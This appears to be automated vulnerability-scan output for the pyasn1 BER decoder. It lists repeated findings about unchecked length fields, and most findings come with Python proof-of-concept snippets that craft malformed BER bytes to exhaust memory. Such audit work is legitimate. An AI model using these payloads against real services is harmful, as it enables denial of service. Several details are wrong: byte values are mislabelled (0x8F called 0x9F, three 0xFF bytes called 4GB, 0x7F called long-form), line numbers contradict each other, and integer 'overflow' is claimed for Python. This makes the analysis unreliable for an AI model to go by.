findings.description: ASN.1 BER decoder performs unbounded memory allocation based on untrusted length field without validation, allowing resource exhaustion DoS attacks
findings.reasoning: The code extracts an untrusted length value directly from input data (firstOctet & 0x7F) and uses it to allocate memory via readFromStream() without any maximum size validation. The comment at line 1673 explicitly acknowledges "missing check on maximum size". An attacker can craft malicious ASN.1 encoded data with extremely large length fields to exhaust server memory. The length parameter is then used to read that many bytes into memory, and subsequently at line 1682, the entire length value is accumulated: "length |= lengthOctet" allowing for allocation of arbitrary amounts of memory.

evidence.code_context: Line 1655-1682 shows length decoding from untrusted ASN.1 data. The firstOctet value comes directly from the input stream (line 1655-1656), then at line 1671 'size = firstOctet & 0x7F' extracts an untrusted value. This size is immediately passed to readFromStream() at line 1672 without bounds checking. Then at lines 1680-1682, the length is accumulated from individual octets with bit shifting: 'length <<= 8; length |= lengthOctet' - allowing accumulation of arbitrarily large values.
evidence.dataflow_analysis: Dataflow: firstOctet (untrusted input from substrate) -> size = firstOctet & 0x7F -> readFromStream(substrate, size, options) -> memory allocation based on size parameter. The readFromStream function at pyasn1/codec/streaming.py:187 calls substrate.read(size) which allocates memory based on the untrusted size parameter.
evidence.notes: The code comment at line 1673 explicitly states 'missing check on maximum size, which shouldn't be a problem, we can handle more than is possible' - this appears to be a false assumption. An attacker sending ASN.1 encoded data with a large length field (e.g., 0xFF = 255 bytes to read for the length descriptor itself, or massive accumulated values from the length octets) can trigger large memory allocations.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder
import io

# Create malicious ASN.1 data with large length field
# BER format: [tag][length][value]
# Use a length of 0x9F (159 decimal) with long form encoding
# 0x9F means 159 bytes follow for the length descriptor
malicious_data = bytes([
    0x30,        # SEQUENCE tag
    0x8F,        # Long form length: high bit set, next 15 bytes contain length
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  # 8 bytes of 0xFF
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF         # 7 more bytes of 0xFF (15 total)
    # This represents a length of 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF (very large)
])

substrate = io.BytesIO(malicious_data)
dec = decoder.Decoder()
try:
    # This will attempt to allocate memory for the massive length value
    result = dec(substrate)
    for item in result:
        pass  # Process results
except MemoryError:
    print('Memory exhaustion triggered!')
exploit_payload.scenario: Attacker sends a malicious ASN.1 encoded message with an extremely large length field in the BER length encoding, causing the decoder to attempt unbounded memory allocation
exploit_payload.category: Denial of Service via Resource Exhaustion

findings.description: ASN.1 BER decoder allocates unbounded memory based on length field from untrusted input at line 145
findings.reasoning: The IntegerPayloadDecoder.valueDecoder method at line 145 calls readFromStream with an untrusted length parameter that comes directly from ASN.1 encoded input. The length parameter is passed from the decoder without validation, allowing an attacker to specify arbitrarily large memory allocations via crafted ASN.1 data, leading to resource exhaustion denial of service.

evidence.code_context: IntegerPayloadDecoder.valueDecoder method at lines 130-160. The function receives 'length' parameter from ASN.1 decoding and passes it directly to readFromStream(substrate, length, options) at line 145 without validation.
evidence.dataflow_analysis: The length parameter flows from the ASN.1 encoded input through the decoder state machine into readFromStream, which then uses it to allocate memory via substrate.read(size) at streaming.py:187-220.
evidence.notes: readFromStream calls substrate.read(size) which allocates memory based on the size parameter. An attacker can craft ASN.1 data with arbitrarily large length values to trigger memory exhaustion.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder
import io

# Craft malicious ASN.1 data with unbounded length field
# BER format: TAG (1 byte) + LENGTH (1+ bytes) + VALUE
# Use a large length value to trigger memory allocation

# Example: Integer tag (0x02) with length encoding for 1GB
malicious_data = bytearray()
malicious_data.append(0x02)  # Integer tag
malicious_data.append(0x84)  # Length encoding indicator (4 bytes follow)
malicious_data.extend([0x40, 0x00, 0x00, 0x00])  # 1 GB in big-endian

substrate = io.BytesIO(bytes(malicious_data))
decoder_instance = decoder.Decoder()

try:
    # This will attempt to allocate 1GB of memory
    result = decoder_instance(substrate)
except MemoryError:
    print("Memory exhaustion triggered")
exploit_payload.scenario: Attacker sends crafted ASN.1 encoded data with extremely large length fields to the decoder, triggering unbounded memory allocation and causing denial of service
exploit_payload.category: Denial of Service via Resource Exhaustion

findings.description: ASN.1 decoder allocates unbounded memory based on untrusted length field from encoded data, enabling resource exhaustion denial of service
findings.code_snippet:
class SingleItemDecoder(object):
    defaultErrorState = stErrorCondition
    #defaultErrorState = stDumpRawValue
    defaultRawDecoder = AnyPayloadDecoder()

    supportIndefLength = True
findings.reasoning: This is the decoder class where the unbounded allocation vulnerability is implemented. The decoder processes ASN.1 encoded data and allocates memory based on length fields extracted directly from untrusted input without validation. Combined with the readFromStream calls at line 145 and 1671, this creates a resource exhaustion vulnerability.

evidence.code_context: The SingleItemDecoder class at line 1524 is the main decoder implementation that processes ASN.1 data. The decoder extracts length values from the input stream and passes them to readFromStream() without proper validation.
evidence.dataflow_analysis: Length values from untrusted ASN.1 encoded data flow directly into readFromStream(substrate, length, options) calls at lines 145 and 1671, which then attempt to read and allocate that amount of memory.
evidence.vulnerability_chain:
1. Untrusted ASN.1 data is read from stream (line 1657)
2. Length octets are extracted and processed (lines 1671-1682)
3. Length value is reconstructed without bounds checking (lines 1677-1680)
4. readFromStream() is called with untrusted length at line 1671 to allocate memory
5. No maximum length validation exists - comment at 1673 acknowledges this
6. Attacker can craft ASN.1 message with extremely large length field to exhaust memory
evidence.notes: The code comment at line 1673 explicitly states 'missing check on maximum size' which confirms this is a known limitation. This allows attackers to trigger memory exhaustion by sending specially crafted ASN.1 messages with large length fields.

exploit_payload.scenario: Attacker sends specially crafted ASN.1 encoded message with a length field specifying gigabytes of data, causing the decoder to attempt unbounded memory allocation and exhaust system memory
exploit_payload.code_snippet:
import io
from pyasn1.codec.ber import decoder

# Craft malicious ASN.1 DER message
# TAG: 0x04 (OCTET STRING)
# LENGTH: 0x83 followed by 3 bytes = large length encoding
# This requests allocation of 0xFFFFFFFF bytes (4GB)
malicious_data = bytes([0x04, 0x83, 0xFF, 0xFF, 0xFF])

# When decoded, this triggers unbounded memory allocation
try:
    stream = io.BytesIO(malicious_data)
    decoder.decode(stream)
except MemoryError:
    print('Memory exhaustion triggered')

findings.description: Integer underflow in BIT STRING decoder - arithmetic operation on length value without overflow check could lead to integer underflow when length is 0.
findings.reasoning: At line 200, the code performs `length - 1` without checking if length is 0 or negative. When decoding a BIT STRING with length=0, this results in length=-1, which is then passed to readFromStream. This causes incorrect behavior as negative lengths are interpreted as indefinite length encoding. The vulnerable operation is `length - 1` where length is user-controlled from the ASN.1 encoded stream.

evidence.code_context: In BIT STRING decoder valueDecoder method, line 200: 'for chunk in readFromStream(substrate, length - 1, options)'. The length parameter comes from the ASN.1 encoded value and is not validated before arithmetic operation.
evidence.dataflow_analysis: The length parameter is passed from the ASN.1 decoder state machine and used directly in arithmetic without bounds checking. A specially crafted ASN.1 stream with length=0 for BIT STRING would cause underflow to -1.
evidence.notes: This is a classic integer underflow vulnerability in parsing untrusted binary data. While Python doesn't have traditional integer overflow, the -1 value has special meaning (indefinite length) which could cause unexpected behavior.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder
import io

# Craft malicious BER-encoded BIT STRING with length 0
# Tag 0x03 (BIT STRING) + Length 0x00 + no value
malicious_ber = bytes([0x03, 0x00])

dec = decoder.Decoder()
try:
    # This will attempt to read length-1 = -1 bytes, causing unexpected behavior
    result, remainder = dec(malicious_ber)
    print(f'Decoded: {result}')
except Exception as e:
    print(f'Error: {e}')
exploit_payload.scenario: Attacker crafts a malicious ASN.1 encoded message with a BIT STRING of length 0, triggering integer underflow in the decoder

findings.description: Integer overflow in SEQUENCE/SET decoder - arithmetic operation on length without overflow check in loop condition.
findings.reasoning: At line 642, the loop condition performs arithmetic: `original_position + length`. If both `original_position` (file position, potentially large) and `length` (user-controlled from ASN.1 stream) are large values, their sum could overflow or wrap around. This affects the loop termination condition for decoding SEQUENCE/SET components.

evidence.code_context: In _decodeComponentsSchemaless method, line 642: 'while length == -1 or substrate.tell() < original_position + length:'. The addition of original_position and length is unchecked.
evidence.dataflow_analysis: original_position comes from substrate.tell() (file pointer), and length comes from the ASN.1 encoded value. Both are user-controlled in a crafted ASN.1 message. Their sum is used directly in the loop condition.
evidence.notes: In Python, integers can be arbitrarily large, but this operation could still cause logic errors if the addition wraps around in unexpected ways or causes excessive memory/CPU usage.

findings.description: Integer overflow in tag ID decoding - arithmetic shift operation without overflow check.
findings.code_snippet:
tagId <<= 7
tagId |= (integerTag & 0x7F)
findings.reasoning: At line 1619, the code performs `tagId <<= 7` in a loop to decode multi-byte tag identifiers. Without bounds checking on the number of bytes read or the maximum value, a crafted ASN.1 stream with many continuation bytes could cause tagId to grow unbounded and overflow.

evidence.code_context: In Decoder._decodeComponent method around line 1619: 'tagId <<= 7' followed by 'tagId |= (integerTag & 0x7F)' in a loop. No maximum size validation on tagId.
evidence.dataflow_analysis: The loop continues reading bytes as long as integerTag & 0x80 is true (continuation bit set). Each iteration shifts tagId left by 7 and ORs in 7 more bits. With no maximum iterations, tagId can grow arbitrarily large.
evidence.notes: This is a potential DoS vector - an attacker can craft ASN.1 with many tag continuation bytes to cause excessive computation.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder

# Craft tag with many continuation bytes
# Tag format: class(2 bits) + constructed(1 bit) + tag number
# For large tag numbers, use continuation bytes
# Each byte: continuation bit (MSB=1) + 7 value bits
malicious_ber = bytes([0x3F])  # Starting tag indicating multi-byte tag
malicious_ber += bytes([0xFF] * 1000)  # Many continuation bytes
malicious_ber += bytes([0x7F])  # Final byte (no continuation)

dec = decoder.Decoder()
try:
    result, remainder = dec(malicious_ber)
except Exception as e:
    print(f'Error: {e}')
exploit_payload.scenario: Attacker crafts malicious ASN.1 with extremely long tag ID encoding (many continuation bytes) to cause integer overflow in tag decoding

findings.description: Integer overflow in length decoding - arithmetic shift operation without maximum size check.
findings.code_snippet:
length = 0
for lengthOctet in encodedLength:
    length <<= 8
    length |= lengthOctet
findings.reasoning: At line 1683-1686, the code decodes the length field from the ASN.1 stream by shifting and ORing bytes. While the number of encoded length bytes is determined by the first length octet (which should be between 1-127 bytes), there's no explicit maximum check. In Python, integers can be arbitrarily large, but a crafted ASN.1 stream claiming a very large length (e.g., 127 bytes of length data) could cause integer overflow or excessive memory usage when this huge length value is used later.

evidence.code_context: In Decoder state machine around line 1683: length decoding loop with shifts. The size variable limits number of bytes read (line 1666: 'size = firstOctet & 0x7F'), but no validation that the resulting length value won't overflow or cause resource exhaustion.
evidence.dataflow_analysis: The firstOctet & 0x7F can be up to 127, meaning up to 127 bytes of length data can be read. In Python, this creates an arbitrarily large integer. Later, this huge length is used in operations like 'substrate.tell() < original_position + length' or 'readFromStream(substrate, length, options)' which could cause issues.
evidence.notes: Comment in code at line 1674 says 'missing check on maximum size, which shouldn\'t be a problem, we can handle more than is possible' - but this is optimistic and could still cause practical issues.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder

# Craft BER with extremely large length encoding
# Length format: if first byte > 128, lower 7 bits indicate number of length bytes
# Craft with 127 bytes of length data (maximum allowed)
malicious_ber = bytes([0x04])  # OCTET STRING tag
malicious_ber += bytes([0xFF])  # First length byte: 127 bytes of length follow
malicious_ber += bytes([0xFF] * 127)  # 127 bytes of 0xFF = 2^1024 - 1 value

dec = decoder.Decoder()
try:
    result, remainder = dec(malicious_ber)
    print(f'Decoded with massive length: {len(str(result))}')
except Exception as e:
    print(f'Error: {e}')
exploit_payload.scenario: Attacker crafts ASN.1 with maximum-length encoding (127 bytes) set to all 0xFF, creating a length value of 2^1024-1 bytes, causing resource exhaustion
exploit_payload.category: Integer overflow / Denial of service / Resource exhaustion

findings.description: Unvalidated length value from ASN.1 BER decoder allows unbounded buffer allocation or resource exhaustion
findings.code_snippet:
if firstOctet < 128:
                    length = firstOctet
findings.reasoning: The length value is assigned directly from the untrusted input (firstOctet) without any validation. While firstOctet < 128 is bounded, this is used later in line 1830 where concreteDecoder.valueDecoder() is called with the untrusted length parameter. The decoder then uses this length to allocate memory/resources without bounds checking. An attacker can craft a malicious ASN.1 packet with an extremely large length value to cause denial of service through memory exhaustion.

evidence.code_context: Lines 1656-1695 show the length decoding logic. At line 1663, length is directly assigned to firstOctet without validation. Later at lines 1826-1831, this untrusted length is passed to concreteDecoder.valueDecoder() which uses it to read from substrate without bounds checking.
evidence.dataflow_analysis: The length variable flows from input octet at line 1663 -> used at line 1831 in concreteDecoder.valueDecoder(substrate, asn1Spec, tagSet, length, ...). No validation occurs between assignment and use.
evidence.notes: The code comment at line 1668 acknowledges 'missing check on maximum size' but claims it shouldn't be a problem. However, this is vulnerable because the length is used to allocate memory/read buffers without any bounds. An attacker sending length=2^31 would cause memory exhaustion.

exploit_payload.code_snippet:
import struct
from pyasn1.codec.ber import decoder

# Create malicious BER packet with extremely large length
# TAG: 0x04 (OCTET STRING), LENGTH: 0x84 (4-byte length follows), VALUE: 0xFFFFFFFF (4GB)
malicious_packet = bytes([0x04, 0x84, 0xFF, 0xFF, 0xFF, 0xFF])

try:
    decoder.decode(malicious_packet)
except MemoryError:
    print('Memory exhaustion triggered')
exploit_payload.scenario: An attacker sends a crafted BER-encoded ASN.1 packet with an exceptionally large declared length value to trigger denial of service through memory exhaustion.

findings.description: Unvalidated length computation from multi-byte encoding allows unbounded integer overflow leading to buffer allocation
findings.code_snippet:
length = 0
                    for lengthOctet in encodedLength:
                        length <<= 8
                        length |= lengthOctet
findings.reasoning: When firstOctet > 128, the length is decoded from multiple bytes without any upper bound validation. The code iterates through encoded length octets and shifts/ORs them into length variable. Since size can be up to 127 (firstOctet & 0x7F), this could create a length of up to 2^1016, which is astronomically large. This untrusted length is then passed to valueDecoder() at line 1831 without validation, causing potential DoS.

evidence.code_context: Lines 1666-1684 show the multi-byte length decoding. At line 1671, encodedLength is converted to list without size validation. Lines 1679-1682 reconstruct the length by shifting/ORing octets. The maximum size is derived from firstOctet & 0x7F which can be up to 127 bytes, allowing exponentially large length values.
evidence.dataflow_analysis: size = firstOctet & 0x7F (can be 0-127) -> encodedLength read from substrate (size bytes) -> length computed via shift/or at lines 1679-1682 -> passed to valueDecoder at line 1831
evidence.notes: The code explicitly has a comment 'missing check on maximum size' at line 1668, acknowledging the issue. No validation prevents extremely large length values from being processed.

exploit_payload.code_snippet:
from pyasn1.codec.ber import decoder

# Create malicious BER packet with 10-byte length encoding
# TAG: 0x04 (OCTET STRING), LENGTH: 0x8A (10 bytes follow), VALUE: all 0xFF
# This creates length = 0xFFFFFFFFFFFFFFFFFFFF = 1329227995784915872903807060280344576
malicious_packet = bytes([0x04, 0x8A]) + bytes([0xFF] * 10)

try:
    decoder.decode(malicious_packet)
except (MemoryError, Exception) as e:
    print(f'DoS triggered: {type(e).__name__}')
exploit_payload.scenario: An attacker sends a BER-encoded ASN.1 packet with a multi-byte length encoding that represents an astronomically large value to trigger memory exhaustion or integer overflow.
exploit_payload.prerequisites: None - the vulnerable code is in the main decoder path

findings.description: Unvalidated indefinite length flag allows unbounded stream processing without termination checks
findings.code_snippet:
else:  # 128 means indefinite
                    length = -1
findings.reasoning: When firstOctet == 128, the code sets length = -1 (indefinite length). This triggers indefinite length decoding at line 1826 via indefLenValueDecoder(). The indefinite length decoder must rely on finding End-of-Octets (EOO) sentinel bytes (0x00 0x00) to terminate. An attacker can omit the EOO sentinel to cause the decoder to read indefinitely until substrate exhaustion, causing DoS.

evidence.code_context: Line 1686 sets length = -1 for indefinite encoding. Line 1687 only checks if indefinite length is supported. At line 1826, if length == -1, indefLenValueDecoder is called which must read until finding EOO sentinel. No timeout or maximum read limit is enforced.
evidence.dataflow_analysis: firstOctet == 128 -> length = -1 -> indefLenValueDecoder called at line 1826 -> decoder reads until EOO sentinel without bounds
evidence.notes: The indefinite length decoder relies entirely on the integrity of the substrate to contain the proper EOO sentinel. A malicious stream without EOO will cause unbounded reads.

exploit_payload.code_snippet:
from pyasn1.codec.ber import decoder
import io

# Create malicious indefinite-length packet without EOO sentinel
# TAG: 0x04 (OCTET STRING), LENGTH: 0x80 (indefinite), VALUE: large payload without 0x00 0x00 terminator
malicious_packet = bytes([0x04, 0x80]) + bytes([0xFF] * 10000)
# Missing the mandatory 0x00 0x00 (EOO sentinel)

try:
    # This will attempt to read the entire malicious_packet looking for EOO
    decoder.decode(malicious_packet)
except Exception as e:
    print(f'DoS triggered: {type(e).__name__}')
exploit_payload.scenario: An attacker sends a BER-encoded ASN.1 packet with indefinite length encoding but omits the required End-of-Octets sentinel, causing the decoder to read unbounded amounts of data.
exploit_payload.prerequisites: None - the vulnerable code is in the main decoder path

findings.description: Unvalidated length in substrate conversion allows buffer over-allocation
findings.reasoning: In the _callSubstrateFunV4asV5 method, when length is -1 (indefinite), it's replaced with the full length of substrate_bytes read. However, substrate_bytes itself is read without bounds - there's no validation that substrate.read() won't consume an excessive amount of memory. An attacker can craft a malicious substrate that causes excessive memory allocation.

evidence.code_context: Lines 2118-2121 show substrate_bytes = substrate.read() without any size limit. If substrate is an untrusted input stream with no maximum size, this can allocate arbitrary amounts of memory.
evidence.dataflow_analysis: substrate (untrusted input) -> substrate.read() (unbounded read) -> substrate_bytes stored in memory -> length = len(substrate_bytes) -> passed to substrateFunV4
evidence.notes: The substrate parameter comes from user input (the decode() method). If a user provides a large stream or a stream that reports unlimited size, this will cause memory exhaustion.

exploit_payload.scenario: An attacker provides a malicious stream to the BER decoder that claims to have unlimited data, causing the decoder to attempt unbounded memory allocation.
exploit_payload.prerequisites: Ability to control the input stream passed to decoder

findings.description: Length value derived from untrusted input without validation - encodedLength list conversion without bounds checking could lead to resource exhaustion
findings.code_snippet: encodedLength = list(encodedLength)
findings.reasoning: At line 1671, encodedLength is converted to a list without validation of its size. The size is derived from the first octet (firstOctet & 0x7F) at line 1664 which comes directly from untrusted input. While there is a check that len(encodedLength) == size at line 1673, there is no validation of the maximum acceptable size value. An attacker could craft an ASN.1 message with a very large size value (up to 127 bytes) which would be read from substrate without bounds checking, potentially causing resource exhaustion or denial of service.

evidence.code_context:
Line 1664: size = firstOctet & 0x7F (untrusted input)
Line 1667-1669: readFromStream(substrate, size, options) reads 'size' bytes
Line 1671: encodedLength = list(encodedLength) - no validation of size
Line 1673: Check only validates len(encodedLength) == size, not that size itself is reasonable
evidence.dataflow_analysis: The size value flows directly from firstOctet (untrusted) -> used in readFromStream without bounds checking -> converted to list without validation
evidence.notes: The code comment at line 1672 states 'missing check on maximum size, which shouldn't be a problem, we can handle more than is possible' - but this is exactly the vulnerability. An attacker can specify very large sizes to exhaust memory or cause denial of service.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder
# Craft malicious ASN.1 with large length encoding
# Tag: 0x30 (SEQUENCE), Length: 0x7F (127 bytes encoded length indicator)
# This tells decoder to read 127 bytes for the length encoding itself
malicious_asn1 = b'\x30\x7f' + b'\x00' * 127 + b'\x00' * 1000
try:
    result = decoder.decode(malicious_asn1)
except Exception as e:
    print(f'Potential DoS triggered: {e}')
exploit_payload.scenario: Attacker sends a crafted ASN.1-encoded message with an excessively large length encoding size indicator, causing the decoder to attempt reading and processing a very large amount of data, leading to resource exhaustion or denial of service

findings.description: Class-level setting for indefinite length support without per-instance validation of decoded length values
findings.code_snippet: supportIndefLength = True
findings.reasoning: The supportIndefLength flag at line 1532 is a class-level boolean that determines whether indefinite length encoding is allowed. While there is a check at line 1688 that validates length == -1 against this flag, the fundamental issue is that positive length values decoded from untrusted input (lines 1663, 1679) are not validated against any maximum bounds. An attacker can specify arbitrarily large positive length values that will be accepted without validation, potentially causing buffer overflows or resource exhaustion when these lengths are used in valueDecoder calls.

evidence.code_context:
Line 1532: supportIndefLength = True (class-level flag)
Line 1663: length = firstOctet (range 0-127)
Line 1679: length = 0 then accumulated in loop (can be arbitrarily large)
Line 1686: length = -1 (indefinite)
Line 1688: Only checks if length == -1 and supportIndefLength
Lines 1826-1837: Length is passed to valueDecoder or indefLenValueDecoder without bounds validation
evidence.dataflow_analysis: Untrusted firstOctet -> decoded to length -> used in decoder.valueDecoder(substrate, ..., length, ...) without maximum value validation
evidence.notes: The vulnerable code accepts any positive length value up to the maximum integer size. While BER/DER standards define maximum lengths, the decoder does not enforce reasonable limits.

exploit_payload.code_snippet:
import pyasn1.codec.ber.decoder as decoder
# Craft ASN.1 with extremely large length
# Tag: 0x30, Length encoding: 0x84 (4-byte length follows)
malicious_asn1 = b'\x30\x84' + b'\xff\xff\xff\xff' + b'\x00' * 100
try:
    result = decoder.decode(malicious_asn1)
except Exception as e:
    print(f'DoS via large length value: {e}')
exploit_payload.scenario: Attacker sends ASN.1 message with extremely large length value (e.g., 4GB), causing decoder to allocate excessive memory or attempt to read beyond available substrate
